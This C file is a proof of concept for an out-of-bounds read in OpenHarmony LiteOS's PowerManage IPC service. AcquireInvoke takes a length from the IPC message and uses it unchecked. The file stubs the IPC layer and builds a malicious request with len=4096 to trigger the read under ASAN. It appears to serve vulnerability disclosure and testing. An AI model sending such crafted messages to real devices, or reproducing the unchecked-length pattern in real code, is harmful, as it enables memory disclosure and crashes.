/*
 * PoC: Buffer access with untrusted index/length without bounds validation
 * 
 * Vulnerability: In AcquireInvoke(), the function reads a `len` value from
 * the IPC request (untrusted input), then passes it directly to ReadBuffer()
 * without validating that `len` corresponds to the actual size of the
 * RunningLockEntry structure or that it doesn't exceed the IPC buffer bounds.
 * 
 * CWE: CWE-125 (Out-of-bounds Read) / CWE-129 (Improper Validation of Array Index)
 * 
 * Call chain:
 *   FeatureInvoke(iProxy, funcId=0, origin, req, reply)
 *     -> g_invokeFuncs[0] == AcquireInvoke(iProxy, origin, req, reply)
 *       -> ReadUint32(req, &len)    // attacker controls len
 *       -> ReadBuffer(req, len)     // no bounds check on len vs actual buffer
 *       -> OnAcquireRunningLockEntry(..., (RunningLockEntry*)data, ...)
 *           // data may point to out-of-bounds memory or be misinterpreted
 *
 * Trigger: An IPC client sends a crafted message with funcId=0 and a `len`
 * value that is much larger than the actual data in the IPC buffer, causing
 * ReadBuffer to return a pointer to memory beyond the valid IPC payload,
 * or the returned data is then cast to RunningLockEntry* and accessed
 * without verifying the length matches sizeof(RunningLockEntry).
 *
 * Expected behavior: Out-of-bounds read / heap-buffer-overflow when the
 * returned buffer pointer is dereferenced as a RunningLockEntry structure.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

/* ============================================================
 * Minimal type definitions to match the OpenHarmony LiteOS IPC
 * ============================================================ */

#define EC_SUCCESS 0
#define EC_FAILURE (-1)
#define EC_INVALID (-2)
#define BOOL int
#define TRUE 1
#define FALSE 0

/* Simulated IpcIo structure - represents an IPC message buffer */
typedef struct {
    uint8_t *bufStart;
    uint8_t *bufCur;    /* current read position */
    uint8_t *bufEnd;    /* end of valid data */
    uint32_t bufSize;
} IpcIo;

typedef void IServerProxy;
typedef void IUnknown;

/* Simulated RunningLockEntry - the structure expected by the callee */
typedef struct {
    uint32_t lockId;
    uint32_t lockType;
    uint32_t pid;
    uint32_t uid;
    char name[128];
    uint64_t timeout;
} RunningLockEntry;

/* Function ID enum matching the real code */
enum PowerManageFuncId {
    ONACQUIRE = 0,
    ONRELEASE,
    ISANYHOLDING,
    ONSUSPEND,
    ONWAKEUP,
    POWERMANAGE_FUNCID_BUTT
};

/* ============================================================
 * Stubbed IPC read functions (simulating LiteOS IPC layer)
 * These read from the IpcIo buffer as the real implementation would.
 * ============================================================ */

static void ReadUint32(IpcIo *io, uint32_t *value)
{
    if (io->bufCur + sizeof(uint32_t) <= io->bufEnd) {
        memcpy(value, io->bufCur, sizeof(uint32_t));
        io->bufCur += sizeof(uint32_t);
        printf("[PoC] ReadUint32: read value = %u\n", *value);
    } else {
        *value = 0;
        printf("[PoC] ReadUint32: buffer exhausted, returning 0\n");
    }
}

static void ReadInt32(IpcIo *io, int32_t *value)
{
    if (io->bufCur + sizeof(int32_t) <= io->bufEnd) {
        memcpy(value, io->bufCur, sizeof(int32_t));
        io->bufCur += sizeof(int32_t);
        printf("[PoC] ReadInt32: read value = %d\n", *value);
    } else {
        *value = 0;
    }
}

/*
 * ReadBuffer: This is the critical function. In the real implementation,
 * it returns a pointer into the IPC buffer at the current offset, advancing
 * by `len` bytes. If `len` is attacker-controlled and exceeds the remaining
 * buffer, this can return a pointer that, when dereferenced, causes OOB access.
 *
 * The REAL vulnerability: len is read from the IPC message (untrusted) and
 * passed here WITHOUT validation against sizeof(RunningLockEntry) or the
 * remaining buffer size.
 */
static void *ReadBuffer(IpcIo *io, uint32_t len)
{
    printf("[PoC] ReadBuffer: requested len = %u, remaining = %ld\n",
           len, (long)(io->bufEnd - io->bufCur));

    /* TRIGGER: No bounds check on len vs remaining buffer.
     * The real LiteOS IPC ReadBuffer may return the current pointer
     * and advance by len even if len > remaining bytes. */
    void *ptr = io->bufCur;

    /* Advance cursor by the attacker-supplied len (may go past bufEnd) */
    io->bufCur += len;

    if (io->bufCur > io->bufEnd) {
        printf("[PoC] WARNING: ReadBuffer advanced past buffer end! OOB condition.\n");
        /* In real system this would still return the pointer, leading to OOB read
         * when the caller dereferences it as RunningLockEntry* */
    }

    return ptr;
}

static void WriteInt32(IpcIo *io, int32_t value)
{
    /* Stub - reply writing */
    printf("[PoC] WriteInt32 to reply: %d\n", value);
}

static void WriteBool(IpcIo *io, bool value)
{
    (void)io; (void)value;
}

/* ============================================================
 * Stub for the downstream function that accesses the buffer
 * as a RunningLockEntry*. This is where the OOB data gets used.
 * ============================================================ */
static int32_t OnAcquireRunningLockEntry(IUnknown *iProxy, RunningLockEntry *entry, int32_t timeoutMs)
{
    printf("[PoC] OnAcquireRunningLockEntry called\n");
    printf("[PoC] Accessing entry->lockId...\n");

    /* TRIGGER: Dereferencing entry which points to OOB memory.
     * If len was crafted to be larger than the actual IPC payload,
     * 'entry' points to memory beyond the valid buffer, causing
     * an out-of-bounds read here. */
    printf("[PoC] entry->lockId = %u\n", entry->lockId);
    printf("[PoC] entry->lockType = %u\n", entry->lockType);
    printf("[PoC] entry->pid = %u\n", entry->pid);
    printf("[PoC] entry->name = %.16s\n", entry->name);  /* OOB read */

    return EC_SUCCESS;
}

/* ============================================================
 * REAL vulnerable function: AcquireInvoke (copied from source)
 * Note: No bounds check on `len` before passing to ReadBuffer,
 * and no validation that len == sizeof(RunningLockEntry).
 * ============================================================ */
static int32_t AcquireInvoke(IServerProxy *iProxy, void *origin, IpcIo *req, IpcIo *reply)
{
    printf("[PoC] AcquireInvoke entered\n");

    uint32_t len = 0;
    ReadUint32(req, &len);
    /* VULNERABILITY: len comes from untrusted IPC input.
     * No check: if (len != sizeof(RunningLockEntry)) return EC_INVALID;
     * No check: if (len > remaining_buffer_size) return EC_INVALID; */
    void *data = (void*)ReadBuffer(req, len);
    int32_t timeoutMs = 0;
    ReadInt32(req, &timeoutMs);
    int32_t ret = OnAcquireRunningLockEntry((IUnknown *)iProxy, (RunningLockEntry *)data, timeoutMs);
    WriteInt32(reply, ret);
    return EC_SUCCESS;
}

/* ============================================================
 * REAL caller: FeatureInvoke (copied from source, simplified logging)
 * This is the public IPC dispatch entry point.
 * ============================================================ */
typedef int32_t (*InvokeFunc)(IServerProxy *, void *, IpcIo *, IpcIo *);

static InvokeFunc g_invokeFuncs[POWERMANAGE_FUNCID_BUTT] = {
    AcquireInvoke,
    NULL, /* ReleaseInvoke */
    NULL, /* IsAnyHoldingInvoke */
    NULL, /* SuspendInvoke */
    NULL, /* WakeupInvoke */
};

static int32_t FeatureInvoke(IServerProxy *iProxy, int32_t funcId, void *origin, IpcIo *req, IpcIo *reply)
{
    printf("[PoC] FeatureInvoke called with funcId=%d\n", funcId);

    if ((iProxy == NULL) || (req == NULL)) {
        printf("[PoC] Invalid parameter\n");
        return EC_INVALID;
    }

    return (funcId >= 0 && funcId < POWERMANAGE_FUNCID_BUTT) ? g_invokeFuncs[funcId](iProxy, origin, req, reply) :
        EC_FAILURE;
}

/* ============================================================
 * TEST DRIVER: Simulates a malicious IPC client sending a crafted
 * message to the PowerManage service.
 * ============================================================ */
int main(void)
{
    printf("[PoC] === Buffer OOB via untrusted len in AcquireInvoke ===\n\n");

    /*
     * Craft a malicious IPC buffer.
     * Layout of the IPC request for AcquireInvoke:
     *   [uint32_t len] [buffer of 'len' bytes] [int32_t timeoutMs]
     *
     * Attack: We set len = 4096 (much larger than sizeof(RunningLockEntry) = ~152)
     * but only provide a small actual buffer. This causes ReadBuffer to return
     * a pointer, and when the result is cast to RunningLockEntry* and accessed,
     * it reads beyond the allocated buffer.
     */

    /* Allocate a small IPC buffer (simulating real IPC message size) */
    uint32_t actual_payload_size = 16;  /* Only 16 bytes of real data */
    uint32_t ipc_buf_size = sizeof(uint32_t) + actual_payload_size + sizeof(int32_t);

    /* Use a heap buffer so ASAN can detect the OOB access */
    uint8_t *ipc_buffer = (uint8_t *)malloc(ipc_buf_size);
    if (!ipc_buffer) {
        printf("[PoC] malloc failed\n");
        return 1;
    }
    memset(ipc_buffer, 0x41, ipc_buf_size);  /* Fill with recognizable pattern */

    /*
     * Write the malicious len value into the buffer.
     * len = 4096: This is the attacker-controlled value that exceeds
     * both sizeof(RunningLockEntry) and the actual buffer size.
     * The fix should validate: len == sizeof(RunningLockEntry) AND
     * len <= remaining buffer space.
     */
    uint32_t malicious_len = 4096;  /* Way larger than actual data */
    memcpy(ipc_buffer, &malicious_len, sizeof(uint32_t));
    printf("[PoC] Crafted IPC buffer with malicious len=%u (actual data=%u bytes)\n",
           malicious_len, actual_payload_size);
    printf("[PoC] sizeof(RunningLockEntry) = %zu\n\n", sizeof(RunningLockEntry));

    /* Set up the IpcIo structure pointing to our crafted buffer */
    IpcIo req_io = {
        .bufStart = ipc_buffer,
        .bufCur = ipc_buffer,
        .bufEnd = ipc_buffer + ipc_buf_size,  /* Real end of allocated memory */
        .bufSize = ipc_buf_size
    };

    /* Reply buffer (not important for the vulnerability) */
    uint8_t reply_buf[64] = {0};
    IpcIo reply_io = {
        .bufStart = reply_buf,
        .bufCur = reply_buf,
        .bufEnd = reply_buf + sizeof(reply_buf),
        .bufSize = sizeof(reply_buf)
    };

    /* Simulate a minimal IServerProxy (just needs to be non-NULL) */
    int fake_proxy = 1;

    printf("[PoC] Calling FeatureInvoke(funcId=0) to reach AcquireInvoke...\n\n");

    /*
     * PUBLIC API ENTRY POINT: FeatureInvoke
     * This is the IPC dispatch function registered as the service handler.
     * funcId=0 routes to AcquireInvoke (the vulnerable function).
     */
    int32_t result = FeatureInvoke(
        (IServerProxy *)&fake_proxy,
        0,              /* funcId = ONACQUIRE, routes to AcquireInvoke */
        NULL,           /* origin - not used in AcquireInvoke */
        &req_io,        /* crafted IPC request with malicious len */
        &reply_io       /* reply buffer */
    );

    printf("\n[PoC] FeatureInvoke returned: %d\n", result);
    printf("[PoC] If running under ASAN/MSAN, a heap-buffer-overflow should be reported.\n");
    printf("[PoC] The vulnerability: len=%u was read from IPC (untrusted) and used\n", malicious_len);
    printf("[PoC] without bounds validation before buffer access.\n");

    free(ipc_buffer);
    return 0;
}